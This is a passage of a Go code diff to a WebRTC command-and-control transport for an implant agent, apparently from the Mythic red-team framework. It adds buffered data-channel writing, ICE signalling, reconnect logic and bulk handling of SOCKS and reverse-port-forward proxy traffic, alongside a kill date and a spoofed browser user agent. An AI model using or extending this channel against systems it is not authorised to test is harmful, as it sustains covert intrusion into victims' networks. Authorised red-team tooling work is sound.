@@ -25,14 +25,24 @@ import (
 )
 
 const (
-	webRTCTaskingTypePush          = "Push"
-	webRTCDefaultUserAgent         = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
-	webRTCDataChannelTimeout       = 30 * time.Second
-	webRTCReconnectMaxRetries      = 5
-	webRTCKillDateCheckInterval    = 60 * time.Second
-	webRTCDataChannelCheckInterval = 200 * time.Millisecond
-	webRTCSDPAnswerTimeout         = 5 * time.Second
-	webRTCConnectionTimeout        = 8 * time.Second
+	webRTCTaskingTypePush                = "Push"
+	webRTCDefaultUserAgent               = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
+	webRTCDefaultDataChannelTimeout      = 30 * time.Second
+	webRTCDefaultReconnectMaxRetries     = 5
+	webRTCKillDateCheckInterval          = 60 * time.Second
+	webRTCDefaultSDPAnswerTimeout        = 15 * time.Second
+	webRTCDefaultICEConnectionTimeout    = 30 * time.Second
+	webRTCDefaultReconnectInitialBackoff = 2 * time.Second
+	webRTCDefaultReconnectMaxBackoff     = 30 * time.Second
+
+	webRTCProxyPushChannelSize     = 4096
+	webRTCDataChannelHighQueueSize = 512
+	webRTCDataChannelBulkQueueSize = 4096
+	webRTCBufferedAmountHigh       = 4 * 1024 * 1024
+	webRTCBufferedAmountLow        = 1 * 1024 * 1024
+	webRTCWriterEnqueueTimeout     = 5 * time.Second
+	webRTCWriterPollInterval       = 100 * time.Millisecond
+	webRTCMaxOutboundFrameSize     = 8 * 1024 * 1024
 )
 
 var webrtc_initial_config string
@@ -92,13 +102,132 @@ func (e *WebRTCInitialConfig) UnmarshalJSON(data []byte) error {
 }
 
 type webRTCSignalMessage struct {
-	Type        string `json:"type"`
-	Destination string `json:"destination"`
-	SDP         string `json:"sdp,omitempty"`
-	Candidate   string `json:"candidate,omitempty"`
-	AuthKey     string `json:"authKey"`
-	AgentUUID   string `json:"agentUUID,omitempty"`
-	Data        string `json:"data,omitempty"`
+	Type             string  `json:"type"`
+	Destination      string  `json:"destination"`
+	SDP              string  `json:"sdp,omitempty"`
+	Candidate        string  `json:"candidate,omitempty"`
+	SDPMid           *string `json:"sdpMid,omitempty"`
+	SDPMLineIndex    *uint16 `json:"sdpMLineIndex,omitempty"`
+	UsernameFragment *string `json:"usernameFragment,omitempty"`
+	AuthKey          string  `json:"authKey"`
+	AgentUUID        string  `json:"agentUUID,omitempty"`
+	Data             string  `json:"data,omitempty"`
+}
+
+type webRTCDataChannelWriter struct {
+	dataChannel *webrtc.DataChannel
+	highQueue   chan []byte
+	bulkQueue   chan []byte
+	done        chan struct{}
+	lowBuffer   chan struct{}
+	stopOnce    sync.Once
+	onError     func(error)
+}
+
+func newWebRTCDataChannelWriter(dataChannel *webrtc.DataChannel, onError func(error)) *webRTCDataChannelWriter {
+	writer := &webRTCDataChannelWriter{
+		dataChannel: dataChannel,
+		highQueue:   make(chan []byte, webRTCDataChannelHighQueueSize),
+		bulkQueue:   make(chan []byte, webRTCDataChannelBulkQueueSize),
+		done:        make(chan struct{}),
+		lowBuffer:   make(chan struct{}, 1),
+		onError:     onError,
+	}
+	dataChannel.SetBufferedAmountLowThreshold(webRTCBufferedAmountLow)
+	dataChannel.OnBufferedAmountLow(func() {
+		select {
+		case writer.lowBuffer <- struct{}{}:
+		default:
+		}
+	})
+	go writer.run()
+	return writer
+}
+
+func (w *webRTCDataChannelWriter) Stop() {
+	w.stopOnce.Do(func() {
+		close(w.done)
+	})
+}
+
+func (w *webRTCDataChannelWriter) Enqueue(data []byte, bulk bool) error {
+	if len(data) > webRTCMaxOutboundFrameSize {
+		return fmt.Errorf("data channel frame too large: %d > %d", len(data), webRTCMaxOutboundFrameSize)
+	}
+	queue := w.highQueue
+	if bulk {
+		queue = w.bulkQueue
+	}
+
+	select {
+	case queue <- data:
+		return nil
+	case <-w.done:
+		return fmt.Errorf("data channel writer closed")
+	case <-time.After(webRTCWriterEnqueueTimeout):
+		return fmt.Errorf("data channel writer queue full")
+	}
+}
+
+func (w *webRTCDataChannelWriter) run() {
+	defer w.Stop()
+	for {
+		select {
+		case data := <-w.highQueue:
+			if !w.writeOrStop(data) {
+				return
+			}
+		default:
+			select {
+			case data := <-w.highQueue:
+				if !w.writeOrStop(data) {
+					return
+				}
+			case data := <-w.bulkQueue:
+				if !w.writeOrStop(data) {
+					return
+				}
+			case <-w.done:
+				return
+			}
+		}
+	}
+}
+
+func (w *webRTCDataChannelWriter) writeOrStop(data []byte) bool {
+	if err := w.write(data); err != nil {
+		if !w.isStopped() && w.onError != nil {
+			w.onError(err)
+		}
+		return false
+	}
+	return true
+}
+
+func (w *webRTCDataChannelWriter) isStopped() bool {
+	select {
+	case <-w.done:
+		return true
+	default:
+		return false
+	}
+}
+
+func (w *webRTCDataChannelWriter) write(data []byte) error {
+	for w.dataChannel.BufferedAmount() > webRTCBufferedAmountHigh {
+		select {
+		case <-w.lowBuffer:
+		case <-time.After(webRTCWriterPollInterval):
+		case <-w.done:
+			return fmt.Errorf("data channel writer stopped")
+		}
+	}
+
+	if w.dataChannel.ReadyState() != webrtc.DataChannelStateOpen {
+		return fmt.Errorf("data channel not open: %s", w.dataChannel.ReadyState().String())
+	}
+
+	return w.dataChannel.Send(data)
 }
 
 type C2WebRTC struct {
@@ -117,6 +246,7 @@ type C2WebRTC struct {
 
 	signalingConn  *websocket.Conn
 	DataChannel    *webrtc.DataChannel
+	dataWriter     *webRTCDataChannelWriter
 	peerConnection *webrtc.PeerConnection
 
 	finishedStaging bool
@@ -127,7 +257,18 @@ type C2WebRTC struct {
 	PushChannel    chan structs.MythicMessage
 
 	Lock          sync.RWMutex
-	reconnectLock sync.RWMutex
+	reconnectLock sync.Mutex
+	signalingLock sync.Mutex
+	stateLock     sync.RWMutex
+
+	reconnecting             bool
+	dataChannelOpen          chan struct{}
+	iceConnected             chan struct{}
+	peerConnected            chan struct{}
+	lastICEState             webrtc.ICEConnectionState
+	lastPeerConnectionState  webrtc.PeerConnectionState
+	localCandidatesSent      int
+	remoteCandidatesReceived int
 }
 
 func (e C2WebRTC) MarshalJSON() ([]byte, error) {
@@ -194,7 +335,7 @@ func NewC2WebRTC(config WebRTCInitialConfig) (*C2WebRTC, error) {
 		userAgent = webRTCDefaultUserAgent
 	}
 
-	return &C2WebRTC{
+	profile := &C2WebRTC{
 		SignalingServer: config.SignalingServer,
 		AuthKey:         config.AuthKey,
 		TurnServer:      config.TurnServer,
@@ -208,13 +349,99 @@ func NewC2WebRTC(config WebRTCInitialConfig) (*C2WebRTC, error) {
 		killdate:        killDateTime,
 		ShouldStop:      true,
 		stoppedChannel:  make(chan bool, 1),
-		PushChannel:     make(chan structs.MythicMessage, 100),
-	}, nil
+		PushChannel:     make(chan structs.MythicMessage, webRTCProxyPushChannelSize),
+	}
+	profile.resetConnectionState()
+	return profile, nil
 }
 
 func parseWebRTCKillDate(killdate string) (time.Time, error) {
 	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
 	return time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+}
+
+func newWebRTCStateChannel() chan struct{} {
+	return make(chan struct{}, 1)
+}
+
+func signalWebRTCState(ch chan struct{}) {
+	select {
+	case ch <- struct{}{}:
+	default:
+	}
+}
+
+func (c *C2WebRTC) resetConnectionState() {
+	c.stateLock.Lock()
+	defer c.stateLock.Unlock()
+
+	c.dataChannelOpen = newWebRTCStateChannel()
+	c.iceConnected = newWebRTCStateChannel()
+	c.peerConnected = newWebRTCStateChannel()
+	c.lastICEState = webrtc.ICEConnectionStateNew
+	c.lastPeerConnectionState = webrtc.PeerConnectionStateNew
+	c.localCandidatesSent = 0
+	c.remoteCandidatesReceived = 0
+}
+
+func (c *C2WebRTC) connectionEventChannels() (chan struct{}, chan struct{}, chan struct{}) {
+	c.stateLock.RLock()
+	defer c.stateLock.RUnlock()
+	return c.dataChannelOpen, c.iceConnected, c.peerConnected
+}
+
+func (c *C2WebRTC) recordDataChannelOpen() {
+	c.stateLock.RLock()
+	dataChannelOpen := c.dataChannelOpen
+	c.stateLock.RUnlock()
+	signalWebRTCState(dataChannelOpen)
+}
+
+func (c *C2WebRTC) recordICEConnectionState(state webrtc.ICEConnectionState) {
+	c.stateLock.Lock()
+	c.lastICEState = state
+	iceConnected := c.iceConnected
+	c.stateLock.Unlock()
+
+	if state == webrtc.ICEConnectionStateConnected || state == webrtc.ICEConnectionStateCompleted {
+		signalWebRTCState(iceConnected)
+	}
+}
+
+func (c *C2WebRTC) recordPeerConnectionState(state webrtc.PeerConnectionState) {
+	c.stateLock.Lock()
+	c.lastPeerConnectionState = state
+	peerConnected := c.peerConnected
+	c.stateLock.Unlock()
+
+	if state == webrtc.PeerConnectionStateConnected {
+		signalWebRTCState(peerConnected)
+	}
+}
+
+func (c *C2WebRTC) recordLocalCandidateSent() {
+	c.stateLock.Lock()
+	c.localCandidatesSent++
+	c.stateLock.Unlock()
+}
+
+func (c *C2WebRTC) recordRemoteCandidateReceived() {
+	c.stateLock.Lock()
+	c.remoteCandidatesReceived++
+	c.stateLock.Unlock()
+}
+
+func (c *C2WebRTC) connectionStateSummary() string {
+	c.stateLock.RLock()
+	defer c.stateLock.RUnlock()
+
+	return fmt.Sprintf(
+		"local_candidates_sent=%d remote_candidates_received=%d last_ice_state=%s last_peer_connection_state=%s",
+		c.localCandidatesSent,
+		c.remoteCandidatesReceived,
+		c.lastICEState.String(),
+		c.lastPeerConnectionState.String(),
+	)
 }
 
 func (c *C2WebRTC) Sleep() {}
@@ -311,10 +538,15 @@ func (c *C2WebRTC) Stop() {
 }
 
 func (c *C2WebRTC) closeConnections() {
-	if c.signalingConn != nil {
-		c.signalingConn.Close()
-		c.signalingConn = nil
+	c.closeSignalingConnection()
+
+	c.Lock.Lock()
+	if c.dataWriter != nil {
+		c.dataWriter.Stop()
+		c.dataWriter = nil
 	}
+	c.DataChannel = nil
+	c.Lock.Unlock()
 
 	if c.peerConnection != nil {
 		c.peerConnection.Close()
@@ -366,12 +598,16 @@ func (c *C2WebRTC) connectSignaling() error {
 		return fmt.Errorf("failed to dial signaling server: %w", err)
 	}
 
+	c.signalingLock.Lock()
 	c.signalingConn = conn
+	c.signalingLock.Unlock()
 	utils.PrintDebug("Connected to signaling server")
 	return nil
 }
 
 func (c *C2WebRTC) setupWebRTC() error {
+	c.resetConnectionState()
+
 	config := webrtc.Configuration{
 		ICEServers: []webrtc.ICEServer{
 			{
@@ -415,9 +651,20 @@ func (c *C2WebRTC) setupDataChannel() error {
 func (c *C2WebRTC) setupDataChannelHandlers(dc *webrtc.DataChannel) {
 	dc.OnOpen(func() {
 		utils.PrintDebug(fmt.Sprintf("Data channel opened, state: %s", dc.ReadyState().String()))
+		writer := newWebRTCDataChannelWriter(dc, func(err error) {
+			utils.PrintDebug(fmt.Sprintf("Data channel writer error: %v", err))
+			if !c.ShouldStop {
+				c.requestReconnect("Data channel writer failed, attempting reconnect")
+			}
+		})
 		c.Lock.Lock()
+		if c.dataWriter != nil {
+			c.dataWriter.Stop()
+		}
 		c.DataChannel = dc
+		c.dataWriter = writer
 		c.Lock.Unlock()
+		c.recordDataChannelOpen()
 		utils.PrintDebug("WebRTC data channel is ready for communication")
 	})
 
@@ -425,41 +672,85 @@ func (c *C2WebRTC) setupDataChannelHandlers(dc *webrtc.DataChannel) {
 		utils.PrintDebug(fmt.Sprintf("Message of length: %d received on data channel", len(msg.Data)))
 		c.processMessage(msg.Data)
 	})
+
+	dc.OnClose(func() {
+		utils.PrintDebug("Data channel closed")
+		c.Lock.Lock()
+		if c.DataChannel == dc {
+			c.DataChannel = nil
+			if c.dataWriter != nil {
+				c.dataWriter.Stop()
+				c.dataWriter = nil
+			}
+		}
+		c.Lock.Unlock()
+		if !c.ShouldStop {
+			c.requestReconnect("Data channel closed, attempting reconnect")
+		}
+	})
+
+	dc.OnError(func(err error) {
+		utils.PrintDebug(fmt.Sprintf("Data channel error: %v", err))
+		c.Lock.Lock()
+		if c.DataChannel == dc && c.dataWriter != nil {
+			c.dataWriter.Stop()
+			c.dataWriter = nil
+		}
+		c.Lock.Unlock()
+		if !c.ShouldStop {
+			c.requestReconnect("Data channel error, attempting reconnect")
+		}
+	})
 }
 
 func (c *C2WebRTC) setupConnectionStateHandlers() {
 	c.peerConnection.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
+		c.recordPeerConnectionState(state)
 		utils.PrintDebug(fmt.Sprintf("Peer connection state changed: %s", state))
+
+		switch state {
+		case webrtc.PeerConnectionStateConnected:
+			utils.PrintDebug("Peer connection established")
+		case webrtc.PeerConnectionStateDisconnected,
+			webrtc.PeerConnectionStateFailed,
+			webrtc.PeerConnectionStateClosed:
+			c.requestReconnect(fmt.Sprintf("Peer connection state %s, attempting reconnect", state.String()))
+		}
 	})
 
 	c.peerConnection.OnICEConnectionStateChange(func(state webrtc.ICEConnectionState) {
+		c.recordICEConnectionState(state)
 		utils.PrintDebug(fmt.Sprintf("ICE connection state changed: %s", state.String()))
 
 		switch state {
-		case webrtc.ICEConnectionStateConnected:
+		case webrtc.ICEConnectionStateConnected,
+			webrtc.ICEConnectionStateCompleted:
 			utils.PrintDebug("ICE connection established")
 		case webrtc.ICEConnectionStateDisconnected,
 			webrtc.ICEConnectionStateFailed,
 			webrtc.ICEConnectionStateClosed:
 			utils.PrintDebug("WebRTC connection lost, attempting to reconnect")
-			if !c.ShouldStop {
-				go c.reconnect()
-			}
+			c.requestReconnect("ICE connection lost, attempting reconnect")
 		}
 	})
 }
 
 func (c *C2WebRTC) waitForDataChannelReady() error {
 	utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
-	timeout := time.After(webRTCDataChannelTimeout)
-	ticker := time.NewTicker(100 * time.Millisecond)
-	defer ticker.Stop()
+	if c.isDataChannelReady() {
+		utils.PrintDebug("Data channel is ready")
+		return nil
+	}
+
+	dataChannelOpen, _, _ := c.connectionEventChannels()
+	timeout := time.NewTimer(webRTCDefaultDataChannelTimeout)
+	defer timeout.Stop()
 
 	for {
 		select {
-		case <-timeout:
-			return fmt.Errorf("timeout waiting for data channel to open")
-		case <-ticker.C:
+		case <-timeout.C:
+			return fmt.Errorf("timeout waiting for data channel to open after %s (%s)", webRTCDefaultDataChannelTimeout, c.connectionStateSummary())
+		case <-dataChannelOpen:
 			if c.isDataChannelReady() {
 				utils.PrintDebug("Data channel is ready")
 				return nil
@@ -469,6 +760,9 @@ func (c *C2WebRTC) waitForDataChannelReady() error {
 }
 
 func (c *C2WebRTC) closeSignalingConnection() {
+	c.signalingLock.Lock()
+	defer c.signalingLock.Unlock()
+
 	if c.signalingConn != nil {
 		utils.PrintDebug("Closing signaling WebSocket connection")
 		c.signalingConn.Close()
@@ -477,20 +771,43 @@ func (c *C2WebRTC) closeSignalingConnection() {
 	}
 }
 
+func (c *C2WebRTC) writeSignalingMessage(message webRTCSignalMessage) error {
+	c.signalingLock.Lock()
+	defer c.signalingLock.Unlock()
+
+	if c.signalingConn == nil {
+		return fmt.Errorf("signaling connection is nil")
+	}
+	return c.signalingConn.WriteJSON(message)
+}
+
 func (c *C2WebRTC) exchangeSDP() error {
 	utils.PrintDebug("Starting SDP exchange")
+
+	localICECompleteChan := make(chan struct{}, 1)
+	remoteICECompleteChan := make(chan struct{}, 1)
+	offerSent := make(chan struct{})
+	offerSentClosed := false
+	closeOfferSent := func() {
+		if !offerSentClosed {
+			close(offerSent)
+			offerSentClosed = true
+		}
+	}
+	defer closeOfferSent()
+
+	c.setupICECandidateHandler(localICECompleteChan, offerSent)
 
 	if err := c.createAndSetOffer(); err != nil {
 		return err
 	}
 
-	c.setupICECandidateHandler()
-
 	if err := c.sendOffer(); err != nil {
 		return err
 	}
+	closeOfferSent()
 
-	return c.handleSignalingAndWait()
+	return c.handleSignalingAndWait(localICECompleteChan, remoteICECompleteChan)
 }
 
 func (c *C2WebRTC) createAndSetOffer() error {
@@ -508,43 +825,89 @@ func (c *C2WebRTC) createAndSetOffer() error {
 	return nil
 }
 
-func (c *C2WebRTC) setupICECandidateHandler() {
+func (c *C2WebRTC) setupICECandidateHandler(localICECompleteChan chan struct{}, offerSent <-chan struct{}) {
 	c.peerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
 		if candidate == nil {
-			utils.PrintDebug("Received nil ICE candidate, not sending")
+			utils.PrintDebug("Local ICE candidate gathering complete")
+			signalWebRTCCompletion(localICECompleteChan)
+			go c.sendICECompleteMessage(offerSent)
 			return
 		}
-		c.sendICECandidate(candidate)
+		candidateJSON := candidate.ToJSON()
+		go c.sendICECandidate(candidateJSON, offerSent)
 	})
 }
 
-func (c *C2WebRTC) sendICECandidate(candidate *webrtc.ICECandidate) {
-	candidateJSON := candidate.ToJSON()
-	candidateStr := candidateJSON.Candidate
-
-	if candidateStr == "" {
-		utils.PrintDebug("WARNING: Empty candidate string generated")
-		return
+func signalWebRTCCompletion(ch chan struct{}) {
+	select {
+	case ch <- struct{}{}:
+	default:
 	}
+}
 
-	if c.signalingConn == nil {
-		utils.PrintDebug("SignalingConn is nil, can't send ICE candidate")
+func signalingAgentUUID() string {
+	if mythicID := GetMythicID(); mythicID != "" {
+		return mythicID
+	}
+	return UUID
+}
+
+func (c *C2WebRTC) waitForOfferSent(offerSent <-chan struct{}) bool {
+	select {
+	case <-offerSent:
+		return true
+	case <-time.After(webRTCDefaultSDPAnswerTimeout):
+		utils.PrintDebug("Timed out waiting for offer before sending ICE signaling")
+		return false
+	}
+}
+
+func (c *C2WebRTC) sendICECompleteMessage(offerSent <-chan struct{}) {
+	if !c.waitForOfferSent(offerSent) {
 		return
 	}
 
 	signalMessage := webRTCSignalMessage{
-		Type:        "candidate",
+		Type:        "ice_complete",
 		Destination: "answer",
-		Candidate:   candidateStr,
 		AuthKey:     c.AuthKey,
-		AgentUUID:   GetMythicID(),
+		AgentUUID:   signalingAgentUUID(),
 	}
 
-	utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidateStr))
+	if err := c.writeSignalingMessage(signalMessage); err != nil {
+		utils.PrintDebug(fmt.Sprintf("Failed to send ICE completion: %v", err))
+	} else {
+		utils.PrintDebug("Sent ICE completion to server")
+	}
+}
 
-	if err := c.signalingConn.WriteJSON(signalMessage); err != nil {
+func (c *C2WebRTC) sendICECandidate(candidate webrtc.ICECandidateInit, offerSent <-chan struct{}) {
+	if !c.waitForOfferSent(offerSent) {
+		return
+	}
+
+	if candidate.Candidate == "" {
+		utils.PrintDebug("WARNING: Empty candidate string generated")
+		return
+	}
+
+	signalMessage := webRTCSignalMessage{
+		Type:             "candidate",
+		Destination:      "answer",
+		Candidate:        candidate.Candidate,
+		SDPMid:           candidate.SDPMid,
+		SDPMLineIndex:    candidate.SDPMLineIndex,
+		UsernameFragment: candidate.UsernameFragment,
+		AuthKey:          c.AuthKey,
+		AgentUUID:        signalingAgentUUID(),
+	}
+
+	utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidate.Candidate))
+
+	if err := c.writeSignalingMessage(signalMessage); err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to send ICE candidate: %v", err))
 	} else {
+		c.recordLocalCandidateSent()
 		utils.PrintDebug("Successfully sent ICE candidate")
 	}
 }
@@ -560,12 +923,12 @@ func (c *C2WebRTC) sendOffer() error {
 		Destination: "answer",
 		SDP:         offer.SDP,
 		AuthKey:     c.AuthKey,
-		AgentUUID:   GetMythicID(),
+		AgentUUID:   signalingAgentUUID(),
 	}
 
 	utils.PrintDebug("Sending offer message to server")
 
-	if err := c.signalingConn.WriteJSON(offerMessage); err != nil {
+	if err := c.writeSignalingMessage(offerMessage); err != nil {
 		return fmt.Errorf("failed to send offer: %w", err)
 	}
 
@@ -573,21 +936,21 @@ func (c *C2WebRTC) sendOffer() error {
 	return nil
 }
 
-func (c *C2WebRTC) handleSignalingAndWait() error {
+func (c *C2WebRTC) handleSignalingAndWait(localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}) error {
 	sdpChan := make(chan webrtc.SessionDescription, 1)
-	candidateChan := make(chan webrtc.ICECandidateInit, 10)
+	candidateChan := make(chan webrtc.ICECandidateInit, 64)
 	doneChan := make(chan bool, 1)
 
-	go c.handleSignalingMessages(sdpChan, candidateChan, doneChan)
+	go c.handleSignalingMessages(sdpChan, candidateChan, doneChan, remoteICECompleteChan)
 
 	if err := c.waitForSDPAnswer(sdpChan); err != nil {
 		return err
 	}
 
-	return c.waitForDataChannel(candidateChan, doneChan)
+	return c.waitForDataChannel(candidateChan, doneChan, localICECompleteChan, remoteICECompleteChan)
 }
 
-func (c *C2WebRTC) handleSignalingMessages(sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool) {
+func (c *C2WebRTC) handleSignalingMessages(sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, remoteICECompleteChan chan struct{}) {
 	defer func() {
 		if r := recover(); r != nil {
 			utils.PrintDebug(fmt.Sprintf("Recovered from panic in signaling handler: %v", r))
@@ -614,18 +977,22 @@ func (c *C2WebRTC) handleSignalingMessages(sdpChan chan webrtc.SessionDescriptio
 			return
 		}
 
-		if !c.processSignalingMessage(msg, sdpChan, candidateChan, doneChan) {
+		if !c.processSignalingMessage(msg, sdpChan, candidateChan, doneChan, remoteICECompleteChan) {
 			return
 		}
 	}
 }
 
-func (c *C2WebRTC) processSignalingMessage(msg webRTCSignalMessage, sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool) bool {
+func (c *C2WebRTC) processSignalingMessage(msg webRTCSignalMessage, sdpChan chan webrtc.SessionDescription, candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, remoteICECompleteChan chan struct{}) bool {
 	switch msg.Type {
 	case "answer":
 		return c.handleAnswerMessage(msg, sdpChan)
 	case "candidate":
 		return c.handleCandidateMessage(msg, candidateChan)
+	case "ice_complete":
+		utils.PrintDebug("Received ICE completion from server")
+		signalWebRTCCompletion(remoteICECompleteChan)
+		return true
 	case "connected":
 		utils.PrintDebug("Received 'connected' message from signaling server")
 		doneChan <- true
@@ -658,9 +1025,13 @@ func (c *C2WebRTC) handleCandidateMessage(msg webRTCSignalMessage, candidateChan
 		utils.PrintDebug("Received empty ICE candidate from server, ignoring")
 		return true
 	}
+	c.recordRemoteCandidateReceived()
 
 	candidate := webrtc.ICECandidateInit{
-		Candidate: msg.Candidate,
+		Candidate:        msg.Candidate,
+		SDPMid:           msg.SDPMid,
+		SDPMLineIndex:    msg.SDPMLineIndex,
+		UsernameFragment: msg.UsernameFragment,
 	}
 
 	utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
@@ -677,16 +1048,18 @@ func (c *C2WebRTC) waitForSDPAnswer(sdpChan chan webrtc.SessionDescription) erro
 		}
 		utils.PrintDebug("Set remote description successfully")
 		return nil
-	case <-time.After(webRTCSDPAnswerTimeout):
-		return fmt.Errorf("timeout waiting for SDP answer")
+	case <-time.After(webRTCDefaultSDPAnswerTimeout):
+		return fmt.Errorf("timeout waiting for SDP answer after %s (%s)", webRTCDefaultSDPAnswerTimeout, c.connectionStateSummary())
 	}
 }
 
-func (c *C2WebRTC) waitForDataChannel(candidateChan chan webrtc.ICECandidateInit, doneChan chan bool) error {
+func (c *C2WebRTC) waitForDataChannel(candidateChan chan webrtc.ICECandidateInit, doneChan chan bool, localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}) error {
 	candidatesProcessed := 0
-	timeout := time.After(webRTCConnectionTimeout)
-	ticker := time.NewTicker(webRTCDataChannelCheckInterval)
-	defer ticker.Stop()
+	localICEComplete := false
+	remoteICEComplete := false
+	dataChannelOpen, iceConnected, peerConnected := c.connectionEventChannels()
+	timeout := time.NewTimer(webRTCDefaultICEConnectionTimeout)
+	defer timeout.Stop()
 
 	utils.PrintDebug("Processing ICE candidates and waiting for data channel...")
 
@@ -694,9 +1067,28 @@ func (c *C2WebRTC) waitForDataChannel(candidateChan chan webrtc.ICECandidateInit
 		select {
 		case candidate := <-candidateChan:
 			candidatesProcessed += c.processICECandidate(candidate)
-		case <-ticker.C:
+		case <-localICECompleteChan:
+			localICEComplete = true
+		case <-remoteICECompleteChan:
+			remoteICEComplete = true
+		case <-iceConnected:
+			utils.PrintDebug("Observed ICE connected state while waiting for data channel")
 			if c.isDataChannelReady() {
 				c.sendConnectedMessage()
+				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
+				return nil
+			}
+		case <-peerConnected:
+			utils.PrintDebug("Observed peer connected state while waiting for data channel")
+			if c.isDataChannelReady() {
+				c.sendConnectedMessage()
+				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
+				return nil
+			}
+		case <-dataChannelOpen:
+			if c.isDataChannelReady() {
+				c.sendConnectedMessage()
+				c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
 				return nil
 			}
 		case success := <-doneChan:
@@ -704,8 +1096,8 @@ func (c *C2WebRTC) waitForDataChannel(candidateChan chan webrtc.ICECandidateInit
 				return nil
 			}
 			return fmt.Errorf("signaling failed")
-		case <-timeout:
-			return c.handleConnectionTimeout(candidatesProcessed)
+		case <-timeout.C:
+			return c.handleConnectionTimeout(candidatesProcessed, localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
 		}
 	}
 }
@@ -731,34 +1123,51 @@ func (c *C2WebRTC) sendConnectedMessage() {
 		Type:        "connected",
 		Destination: "answer",
 		AuthKey:     c.AuthKey,
-		AgentUUID:   GetMythicID(),
+		AgentUUID:   signalingAgentUUID(),
 	}
 
-	if c.signalingConn != nil {
-		if err := c.signalingConn.WriteJSON(connectedMsg); err != nil {
-			utils.PrintDebug(fmt.Sprintf("Failed to send connected message: %v", err))
-		} else {
-			utils.PrintDebug("Sent 'connected' message to server")
+	if err := c.writeSignalingMessage(connectedMsg); err != nil {
+		utils.PrintDebug(fmt.Sprintf("Failed to send connected message: %v", err))
+	} else {
+		utils.PrintDebug("Sent 'connected' message to server")
+	}
+}
+
+func (c *C2WebRTC) waitForICECompletion(localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}, localICEComplete bool, remoteICEComplete bool) {
+	if localICEComplete && remoteICEComplete {
+		return
+	}
+
+	timeout := time.After(2 * time.Second)
+	for !localICEComplete || !remoteICEComplete {
+		select {
+		case <-localICECompleteChan:
+			localICEComplete = true
+		case <-remoteICECompleteChan:
+			remoteICEComplete = true
+		case <-timeout:
+			utils.PrintDebug(fmt.Sprintf("Continuing after ICE completion grace period; local=%t remote=%t", localICEComplete, remoteICEComplete))
+			return
 		}
 	}
 }
 
-func (c *C2WebRTC) handleConnectionTimeout(candidatesProcessed int) error {
+func (c *C2WebRTC) handleConnectionTimeout(candidatesProcessed int, localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}, localICEComplete bool, remoteICEComplete bool) error {
 	if c.isDataChannelReady() {
 		utils.PrintDebug("Data channel ready at timeout, proceeding")
+		c.sendConnectedMessage()
+		c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
 		return nil
 	}
 
-	if candidatesProcessed > 0 {
-		utils.PrintDebug(fmt.Sprintf("Timeout but processed %d candidates, checking data channel one more time", candidatesProcessed))
-		time.Sleep(1 * time.Second)
-		if c.isDataChannelReady() {
-			utils.PrintDebug("Data channel ready after final check")
-			return nil
-		}
-	}
-
-	return fmt.Errorf("timeout waiting for data channel to be ready")
+	return fmt.Errorf(
+		"timeout waiting for data channel to be ready after %s (candidates_processed=%d local_ice_complete=%t remote_ice_complete=%t %s)",
+		webRTCDefaultICEConnectionTimeout,
+		candidatesProcessed,
+		localICEComplete,
+		remoteICEComplete,
+		c.connectionStateSummary(),
+	)
 }
 
 func (c *C2WebRTC) isExpectedConnectionError(err error) bool {
@@ -780,10 +1189,11 @@ func (c *C2WebRTC) SendMessage(output []byte) []byte {
 func (c *C2WebRTC) sendDataNoResponse(sendData []byte) {
 	if !c.isDataChannelReady() {
 		utils.PrintDebug("Data channel not ready for async send")
-		go c.reconnect()
+		c.requestReconnect("Data channel not ready for async send")
 		return
 	}
 
+	isBulkProxyMessage := isProxyOnlyMythicPayload(sendData)
 	message, err := c.prepareMessage(sendData)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to prepare async message: %v", err))
@@ -791,18 +1201,39 @@ func (c *C2WebRTC) sendDataNoResponse(sendData []byte) {
 	}
 
 	c.Lock.RLock()
-	defer c.Lock.RUnlock()
+	writer := c.dataWriter
+	c.Lock.RUnlock()
 
-	if c.DataChannel == nil || c.DataChannel.ReadyState() != webrtc.DataChannelStateOpen {
-		utils.PrintDebug("Data channel not ready after preparing async message")
-		go c.reconnect()
+	if writer == nil {
+		utils.PrintDebug("Data channel writer not ready after preparing async message")
+		c.requestReconnect("Data channel writer missing for async send")
 		return
 	}
 
-	if err := c.DataChannel.Send(message); err != nil {
-		utils.PrintDebug(fmt.Sprintf("Failed to send async message: %v", err))
-		go c.reconnect()
+	if err := writer.Enqueue(message, isBulkProxyMessage); err != nil {
+		utils.PrintDebug(fmt.Sprintf("Failed to queue async message: %v", err))
+		c.requestReconnect("Data channel enqueue failed")
 	}
+}
+
+func isProxyOnlyMythicPayload(sendData []byte) bool {
+	envelope := make(map[string]json.RawMessage)
+	if err := json.Unmarshal(sendData, &envelope); err != nil {
+		return false
+	}
+
+	_, hasSocks := envelope["socks"]
+	_, hasRpfwd := envelope["rpfwd"]
+	if !hasSocks && !hasRpfwd {
+		return false
